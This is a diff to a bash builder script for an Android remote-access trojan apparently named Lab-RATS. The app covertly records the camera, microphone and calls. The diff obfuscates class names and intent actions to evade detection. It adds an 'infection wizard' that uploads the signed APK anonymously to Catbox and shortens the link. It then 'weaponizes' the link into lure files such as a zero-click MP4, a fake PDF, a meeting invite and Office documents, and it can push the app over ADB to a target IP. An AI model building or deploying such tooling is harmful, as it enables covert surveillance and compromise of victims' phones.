+            find "$PROJECT_DIR/app/src/main/java" -type f -name "*.java" -exec sed -i "s/$ENTITY/$RAND_NAME/g" {} +
+        fi
+        # Rename the actual file
+        FILE_PATH=$(find "$PROJECT_DIR/app/src/main/java" -type f -name "$ENTITY.java")
+        if [ -n "$FILE_PATH" ]; then
+            mv "$FILE_PATH" "$(dirname "$FILE_PATH")/$RAND_NAME.java"
+        fi
+    done
+
+    # Randomize Intent Actions in Constants.java
+    CONSTANTS_JAVA="$PROJECT_DIR/app/src/main/java/com/labs/labrats/Constants.java"
+    ACT_PREFIX="com.labs.$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c 5)"
+
+    # List of action fields to randomize
+    ACTION_FIELDS=("ACTION_AUTO_START" "ACTION_KEEP_ALIVE" "ACTION_START_STREAM" "ACTION_STOP_STREAM" "ACTION_CAPTURE_PHOTO" "ACTION_START_RECORDING" "ACTION_STOP_RECORDING" "ACTION_STOP_OPTICS" "ACTION_START_CORE" "ACTION_STOP_CORE" "ACTION_START_CALL_REC" "ACTION_STOP_CALL_REC" "ACTION_START_MIC_REC" "ACTION_STOP_MIC_REC" "ACTION_CALL_STATE_CHANGED" "ACTION_UPDATE_AUDIO_SETTINGS" "ACTION_STOP_AUDIO" "ACTION_START_AUDIO")
+
+    for FIELD in "${ACTION_FIELDS[@]}"; do
+        RAND_ACTION="${ACT_PREFIX}.$(LC_ALL=C tr -dc 'A-Z0-9' </dev/urandom | head -c 12)"
+        sed_i "s|public static final String $FIELD = \".*\";|public static final String $FIELD = \"$RAND_ACTION\";|g" "$CONSTANTS_JAVA"
+    done
+
+    # Also update Manifest to match Constants actions if they are hardcoded there
+    # (Checking Manifest, it seems some are hardcoded in <receiver> tags)
+    sed_i "s|com.labs.stability.ST_P_01|$(grep "ACTION_AUTO_START" "$CONSTANTS_JAVA" | cut -d'"' -f2)|g" "$MANIFEST"
+    sed_i "s|com.labs.stability.ST_P_02|$(grep "ACTION_KEEP_ALIVE" "$CONSTANTS_JAVA" | cut -d'"' -f2)|g" "$MANIFEST"
 }
 
-# Improved build function with progress bar
+# Progress bar function (SMOOTH OVERWRITE STYLE)
 execute_build() {
-    local task=$1
-    local label=$2
-    local expected_time=$3
-
-    # Start gradle in background, hide output
+    local task=$1; local label=$2; local expected_time=$3
     ./gradlew $task --no-daemon > build_log.txt 2>&1 &
-    local pid=$!
+    local pid=$!; local steps=40;
 
-    # Show progress bar while building
-    local steps=40
-    local sleep_time=$(echo "scale=2; $expected_time / $steps" | bc)
+    # Calculate sleep time using bc, fallback to awk if bc fails
+    local sleep_time=$(echo "scale=4; $expected_time / $steps" | bc 2>/dev/null || awk "BEGIN {print $expected_time / $steps}")
 
-    echo -ne "${CYAN}    [*] $label ["
     for ((i=1; i<=steps; i++)); do
         if ! kill -0 $pid 2>/dev/null; then
-            # Build finished early - snap to 100%
-            for ((j=i; j<=steps; j++)); do echo -ne "█"; done
-            echo -ne "] 100% "
-            echo -e "${GREEN}[DONE]${NC}"
-            wait $pid
-            return $?
+            # Build finished early
+            break
         fi
 
-        echo -ne "█"
         local percentage=$((i * 100 / steps))
-        echo -ne "]"
-        echo -ne " $percentage% "
+        local filled=$i
+        local empty=$((steps - i))
 
-        # If we reach 95% and build is still running, slow down to "finalizing" mode
-        if [ $i -eq 38 ]; then
-            echo -ne "\r${CYAN}    [*] $label ["
-            for ((j=1; j<=38; j++)); do echo -ne "█"; done
-            echo -ne "] 95% ${YELLOW}[FINALIZING...]${NC}"
-            while kill -0 $pid 2>/dev/null; do
-                sleep 0.1
-            done
-            for ((j=39; j<=steps; j++)); do echo -ne "█"; done
-            echo -ne "] 100% "
-            echo -e "${GREEN}[DONE]${NC}"
-            wait $pid
-            return $?
+        # Build the bar string
+        local bar=$(printf "%${filled}s" | tr ' ' '█')
+        local spaces=$(printf "%${empty}s")
+
+        # Print using carriage return (\r) for smooth overwrite
+        # If we reach the end but Gradle is still working, stay at 99% Finishing
+        if [ $i -eq $steps ]; then
+            printf "\r${CYAN}    [*] %-30s [${bar}${spaces}] 99%% ${YELLOW}[FINISHING...]${NC}\033[K" "$label"
+        else
+            printf "\r${CYAN}    [*] %-30s [${bar}${spaces}] %3d%% ${NC}\033[K" "$label" "$percentage"
         fi
-
-        # Simple carriage return reset for next loop
-        echo -ne "\r${CYAN}    [*] $label ["
-        for ((j=1; j<=i; j++)); do echo -ne "█"; done
 
         sleep $sleep_time
     done
+
+    # Wait for actual completion without hanging at 100%
+    while kill -0 $pid 2>/dev/null; do
+        printf "\r${CYAN}    [*] %-30s [$(printf '█%.0s' $(seq 1 $steps))] 99%% ${YELLOW}[FINISHING...]${NC}\033[K" "$label"
+        sleep 0.5
+    done
+
+    wait $pid
+    local status=$?
+
+    # CLEAR LINE and print final result to prevent overlap
+    if [ $status -eq 0 ]; then
+        printf "\r${CYAN}    [*] %-30s [$(printf '█%.0s' $(seq 1 $steps))] 100%% ${GREEN}[DONE]${NC}\033[K\n" "$label"
+    else
+        printf "\r${CYAN}    [*] %-30s [$(printf '█%.0s' $(seq 1 $steps))] ERR  ${RED}[FAIL]${NC}\033[K\n" "$label"
+    fi
+
+    return $status
 }
 
 # Build APK
 build_apk() {
     print_banner
     echo -e "${CYAN}[*] Initializing Build Engine...${NC}"
-    echo ""
-    
     cd "$PROJECT_DIR"
-
-    # Select a compatible Java version (Gradle 8.2 supports up to Java 21)
-    if [ -d "/usr/lib/jvm/java-21-openjdk-amd64" ]; then
-        export JAVA_HOME="/usr/lib/jvm/java-21-openjdk-amd64"
-        export PATH="$JAVA_HOME/bin:$PATH"
-    elif [ -d "/usr/lib/jvm/java-11-openjdk-amd64" ]; then
-        export JAVA_HOME="/usr/lib/jvm/java-11-openjdk-amd64"
-        export PATH="$JAVA_HOME/bin:$PATH"
-    fi
-
-    # Make gradlew executable
     chmod +x gradlew
-    
-    # Load config
-    if [ -f "$CONFIG_FILE" ]; then
-        while IFS='=' read -r key value; do
-            # Remove quotes if present
-            value=$(echo "$value" | sed -e 's/^"//' -e 's/"$//')
-            export "$key"="$value"
-        done < "$CONFIG_FILE"
-    fi
-    
-    # Check if keystore exists - auto-generate if not
-    KEYSTORE_FILE="$PROJECT_DIR/lab-rats-keystore.jks"
-    if [ ! -f "$KEYSTORE_FILE" ]; then
-        echo -e "${YELLOW}[!] No keystore found. Auto-generating...${NC}"
-        generate_keystore "auto"
-        echo ""
-    fi
-    
-    # Create output folder
-    OUTPUT_DIR="$SCRIPT_DIR/output"
-    mkdir -p "$OUTPUT_DIR"
-    
-    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
-    APP_NAME_SAFE=$(echo "${APP_NAME:-System Stability Service}" | tr ' ' '_')
-    VERSION="${VERSION_NAME:-2.0}"
-    
-    APK_FOUND=false
-    
-    # ---------------------------------------------------------
-    # 1. Build Signed APK
-    # ---------------------------------------------------------
-    echo -e "${BLUE}[1/2] Generating Signed Production APK${NC}"
-    execute_build "clean assembleRelease" "Compiling Resources & Signing" 15
-    
-    # Signed release APK
-    RELEASE_APK="$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk"
-    if [ -f "$RELEASE_APK" ]; then
-        OUTPUT_SIGNED="$OUTPUT_DIR/${APP_NAME_SAFE}-v${VERSION}-signed.apk"
-        cp "$RELEASE_APK" "$OUTPUT_SIGNED"
-        echo -e "    ${GREEN}[✓] Saved: $(basename $OUTPUT_SIGNED)${NC}"
-        APK_FOUND=true
+
+    # Slowed down from 15s to 25s to better match modern Gradle build times
+    execute_build "clean assembleRelease" "Compiling Resources & Signing" 25
+    local BUILD_STATUS=$?
+
+    mkdir -p "$SCRIPT_DIR/output"
+    if [ $BUILD_STATUS -eq 0 ] && [ -f "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" ]; then
+        cp "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" "$SCRIPT_DIR/output/signed_v1.apk"
+        echo -e "\n${GREEN}[✓] Success: output/signed_v1.apk${NC}"
+        echo -e "${YELLOW}[*] The build task is complete.${NC}"
     else
-        echo -e "    ${RED}[!] Signed APK generation failed. Check build_log.txt${NC}"
+        echo -e "${RED}[!] Build failed. Error Code: $BUILD_STATUS${NC}"
+        echo -e "${YELLOW}[*] Check build_log.txt for details.${NC}"
+        BUILD_SUCCESS=1
+    fi
+
+    # Revert obfuscation mapping to restore source for next build or editing
+    MAPPING_FILE="$SCRIPT_DIR/build_mapping.txt"
+    if [ -f "$MAPPING_FILE" ]; then
+        echo -e "${CYAN}[*] Restoring source tree...${NC}"
+        MANIFEST="$PROJECT_DIR/app/src/main/AndroidManifest.xml"
+        # Revert in reverse order to avoid substring issues if any
+        # But here we use unique enough names so it's fine.
+        # We need to read the file and reverse its lines or just process normally.
+        while IFS=: read -r ENTITY RAND; do
+            # Update Manifest
+            sed_i "s|\.$RAND|\.$ENTITY|g" "$MANIFEST"
+            # Update all Java files
+            if [ "$OS" == "mac" ]; then
+                find "$PROJECT_DIR/app/src/main/java" -type f -name "*.java" -exec sed -i '' "s/$RAND/$ENTITY/g" {} +
+            else
+                find "$PROJECT_DIR/app/src/main/java" -type f -name "*.java" -exec sed -i "s/$RAND/$ENTITY/g" {} +
+            fi
+            # Rename the actual file
+            FILE_PATH=$(find "$PROJECT_DIR/app/src/main/java" -type f -name "$RAND.java")
+            if [ -n "$FILE_PATH" ]; then
+                mv "$FILE_PATH" "$(dirname "$FILE_PATH")/$ENTITY.java"
+            fi
+        done < "$MAPPING_FILE"
+        rm -f "$MAPPING_FILE"
+    fi
+
+    if [ "$BUILD_SUCCESS" == "1" ]; then
+        echo ""
+        read -p "    Press Enter to return to menu..."
+        return 1
     fi
 
     echo ""
+    read -p "    Press Enter to continue..."
+}
 
-    # ---------------------------------------------------------
-    # 2. Build Unsigned APK
-    # ---------------------------------------------------------
-    echo -e "${BLUE}[2/2] Generating Unsigned Debug APK${NC}"
-    execute_build "assembleRelease -PdisableSigning" "Packaging Assets" 10
-    
-    # Unsigned release APK
-    UNSIGNED_APK="$PROJECT_DIR/app/build/outputs/apk/release/app-release-unsigned.apk"
-    
-    # Fallback checks
-    if [ ! -f "$UNSIGNED_APK" ]; then
-         UNSIGNED_APK_FALLBACK="$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk"
-         if [ -f "$UNSIGNED_APK_FALLBACK" ]; then
-             UNSIGNED_APK="$UNSIGNED_APK_FALLBACK"
-         fi
-    fi
-    
-    if [ -f "$UNSIGNED_APK" ]; then
-        OUTPUT_UNSIGNED="$OUTPUT_DIR/${APP_NAME_SAFE}-v${VERSION}-unsigned.apk"
-        cp "$UNSIGNED_APK" "$OUTPUT_UNSIGNED"
-        echo -e "    ${GREEN}[✓] Saved: $(basename $OUTPUT_UNSIGNED)${NC}"
-        APK_FOUND=true
+# Standalone Exploit Generator
+generate_exploit_standalone() {
+    local TYPE="$1"; local URL="$2"; local EXTRA="$3"
+    EXPLOIT_SRC="$PROJECT_DIR/app/src/main/java/com/labs/labrats/exploits/ExploitLab.java"
+    TEMP_BIN="$SCRIPT_DIR/bin"; mkdir -p "$TEMP_BIN"
+    # Added -sourcepath to help javac find package structure
+    javac -sourcepath "$PROJECT_DIR/app/src/main/java" -d "$TEMP_BIN" "$EXPLOIT_SRC" 2>build_log.txt
+    if [ $? -eq 0 ]; then
+        cd "$SCRIPT_DIR/output"
+        java -cp "$TEMP_BIN" com.labs.labrats.exploits.ExploitLab "$TYPE" "$URL" "$EXTRA" 2>>../build_log.txt
+        cd "$SCRIPT_DIR"
     else
-        echo -e "    ${RED}[!] Unsigned APK generation failed. Check build_log.txt${NC}"
+        echo -e "${RED}[!] Exploit compilation failed. Check build_log.txt${NC}"
     fi
-    
-    if [ "$APK_FOUND" = true ]; then
-        echo ""
-        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
-        echo -e "${GREEN}║                    BUILD SUCCESSFUL!                         ║${NC}"
-        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
-        echo ""
-        echo -e "${GREEN}[✓] APKs saved to: $OUTPUT_DIR${NC}"
-        echo ""
+}
+
+# Infection Chain Wizard
+infection_wizard() {
+    print_banner
+    echo -e "${RED}[>] STRATEGIC_INFECTION_WIZARD${NC}"
+    echo -e "${YELLOW}    Step-by-step automated payload weaponization.${NC}"
+    echo ""
+
+    # Build sequence
+    check_requirements || return
+    generate_keystore
+    configure_app
+    build_apk || return
+
+    local SIGNED_APK="$SCRIPT_DIR/output/signed_v1.apk"
+
+    echo ""
+    echo -e "${CYAN}[HOSTING] Select strategy:${NC}"
+    echo "    1. Anonymous Cloud (Catbox)  2. Direct IP (IPv6)"
+    read -p "    Choice: " H
+    local DOWNLOAD_URL=""
+    if [ "$H" == "2" ]; then
+        read -p "    Target IPv6: " IP
+        DOWNLOAD_URL="http://[$IP]:9191/download/Update.apk"
     else
-        echo ""
-        echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
-        echo -e "${RED}║                      BUILD FAILED!                           ║${NC}"
-        echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
-        echo ""
-        echo -e "${RED}[!] No APK files found. Check errors in build_log.txt${NC}"
-        exit 1
+        echo -e "${YELLOW}[*] Uploading to Catbox.moe...${NC}"
+        # Added -sS and error checking for curl
+        DOWNLOAD_URL=$(curl -sS -F "reqtype=fileupload" -F "fileToUpload=@$SIGNED_APK" https://catbox.moe/user/api.php)
+        if [ $? -ne 0 ] || [[ "$DOWNLOAD_URL" == *"ERROR"* ]] || [ -z "$DOWNLOAD_URL" ]; then
+            echo -e "${RED}[!] Upload failed: $DOWNLOAD_URL${NC}"
+            read -p "Press Enter to return..."
+            return 1
+        fi
+        echo -e "${GREEN}[✓] Hosted: $DOWNLOAD_URL${NC}"
+
+        # URL Shortening (New Optimization)
+        echo -e "${YELLOW}[*] Shortening delivery URL...${NC}"
+        SHORT_URL=$(curl -s "https://is.gd/create.php?format=simple&url=$DOWNLOAD_URL")
+        if [[ "$SHORT_URL" == "http"* ]]; then
+            DOWNLOAD_URL=$SHORT_URL
+            echo -e "${GREEN}[✓] Shortened: $DOWNLOAD_URL${NC}"
+        fi
     fi
+
+    echo ""
+    echo -e "${CYAN}[WEAPONIZE] Select Vector:${NC}"
+    echo "    1. Zero-Click MP4  2. Stealth PDF  3. Meeting Invite"
+    echo "    4. Dolby Audio     5. ADB Script    6. Bluetooth/NFC"
+    echo "    7. Stego Image     8. PWA Bundle    9. Office Word"
+    echo "    10. Office Excel   11. Ghost GIF (Zero-Click)"
+    read -p "    Choice: " V
+    case $V in
+        1) generate_exploit_standalone "mp4" "$DOWNLOAD_URL" ;;
+        2) generate_exploit_standalone "pdf" "$DOWNLOAD_URL" "Security_Audit" ;;
+        3) generate_exploit_standalone "ics" "$DOWNLOAD_URL" "Security_Sync" ;;
+        4) generate_exploit_standalone "dolby" "$DOWNLOAD_URL" ;;
+        5) read -p "    Target IP: " TIP; generate_exploit_standalone "adb" "$DOWNLOAD_URL" "$TIP" ;;
+        6) generate_exploit_standalone "vcf" "$DOWNLOAD_URL" "System_Update" ;;
+        7) generate_exploit_standalone "stego" "$DOWNLOAD_URL" ;;
+        8) generate_exploit_standalone "pwa" "$DOWNLOAD_URL" "System_Update" ;;
+        9) generate_exploit_standalone "docx" "$DOWNLOAD_URL" "Security_Patch" ;;
+        10) generate_exploit_standalone "xlsx" "$DOWNLOAD_URL" "Financial_Report" ;;
+        11) generate_exploit_standalone "gif" "$DOWNLOAD_URL" ;;
+        *) echo -e "${RED}[!] Invalid Choice${NC}" ;;
+    esac
+
+    echo -e "\n${GREEN}DEPLOYMENT PACKAGE READY: $DOWNLOAD_URL${NC}"
+    echo -e "${CYAN}[INFO] Check output directory for payloads.${NC}"
+    read -p "Press Enter to return..."
+}
+
+# Documentation Section
+show_help() {
+    print_banner
+    echo -e "${WHITE}COMMAND_DOCUMENTATION_V1.5.0${NC}"
+    echo "------------------------------------------------------------"
+    echo -e "1. Start Build: Standard production flow."
+    echo -e "2. Keystore Only: Unique signing certificate."
+    echo -e "3. App Settings: Change ID, Name, and Version."
+    echo -e "4. Requirements: Check Java setup."
+    echo -e "5. Infection Wizard: Full Build -> Host -> Weaponize."
+    echo "------------------------------------------------------------"
+    read -p "Press Enter..."
 }
 
 # Main menu
 main_menu() {
     print_banner
-    
     echo -e "${RED}[>] Build Options:${NC}"
     echo ""
     echo "    1. Start Build (Configure & Build)"
     echo "    2. Generate Keystore Only"
-    echo "    3. Configure Logo Only"
-    echo "    4. Configure App Settings Only"
-    echo "    5. Check/Install Requirements"
-    echo "    6. Exit"
+    echo "    3. Configure App Settings Only"
+    echo "    4. Check Requirements"
+    echo "    5. Generate Infection Chain Package (Wizard)"
+    echo "    6. Help / Documentation"
+    echo "    7. Exit"
     echo ""
     read -p "    Choose option (Default 1): " MENU_OPTION
     MENU_OPTION=${MENU_OPTION:-1}
-    
-    echo ""
+
     case $MENU_OPTION in
-        1)
-            check_requirements
-            generate_keystore
-            configure_logo
-            configure_app
-            build_apk
-            ;;
-        2)
-            check_requirements
-            generate_keystore
-            ;;
-        3)
-            detect_os
-            HAS_IMAGEMAGICK=false
-            if command -v convert &> /dev/null; then
-                HAS_IMAGEMAGICK=true
-            fi
-            configure_logo
-            ;;
-        4)
-            configure_app
-            ;;
-        5)
-            check_requirements
-            ;;
-        6)
-            echo -e "${CYAN}[*] Goodbye!${NC}"
-            echo -e "${RED}    Follow: https://github.com/K4N3CO-LABS/Lab-RATS${NC}"
-            exit 0
-            ;;
-        *)
-            echo -e "${RED}[!] Invalid option${NC}"
-            exit 1
-            ;;
+        1) check_requirements && { generate_keystore; configure_app; build_apk; } ;;
+        2) check_requirements && generate_keystore ;;
+        3) configure_app ;;
+        4) check_requirements; echo ""; read -p "    Press Enter to return..." ;;
+        5) infection_wizard ;;
+        6) show_help ;;
+        7) exit 0 ;;
     esac
 }
 
 # Run
-main_menu
+while true; do
+    main_menu
+    # Clean up temporary build artifacts after every loop cycle
+    rm -rf "$SCRIPT_DIR/bin"
+done
